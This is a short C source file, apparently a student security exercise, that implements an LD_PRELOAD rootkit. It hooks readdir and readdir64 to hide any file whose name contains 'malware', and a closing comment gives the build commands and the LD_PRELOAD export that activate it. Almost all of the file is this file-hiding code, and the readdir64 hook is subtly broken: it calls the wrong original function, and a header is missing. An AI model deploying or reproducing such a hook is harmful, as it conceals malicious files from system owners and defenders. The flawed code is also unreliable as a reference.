// Eduard Hauck 108012207435
// Paul Rösler 108012225686
// Philipp Markert 108012225264

#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdarg.h>
#include <dirent.h>


static struct dirent *(*old_readdir)(DIR *dir);
static struct dirent64 *(*old_readdir64)(DIR *dir);



struct dirent * readdir(DIR *dirp)
{
	
	old_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent * dir;

    dir = old_readdir(dirp);

    while (dir != NULL && strstr(dir->d_name,"malware") != NULL){//nicht letzter Eintrag && //contains string malware
    		dir = old_readdir(dirp);
    	
    }

    return dir;
	
}

struct dirent64 * readdir64(DIR *dirp)
{

	old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
	struct dirent64 * dir;

    dir = old_readdir(dirp);

    while (dir != NULL && strstr(dir->d_name,"malware") != NULL){//nicht letzter Eintrag && //contains string malware
    		dir = old_readdir(dirp);
    	
    }

    return dir;
	
	
}

/*
gcc -Wall -fPIC -c -o readdir.O readdir.c
gcc -shared -fPIC -Wl,-soname -Wl,readdir.so -o readdir.so readdir.o
export LD_PRELOAD=$PWD/readdir.so
*/
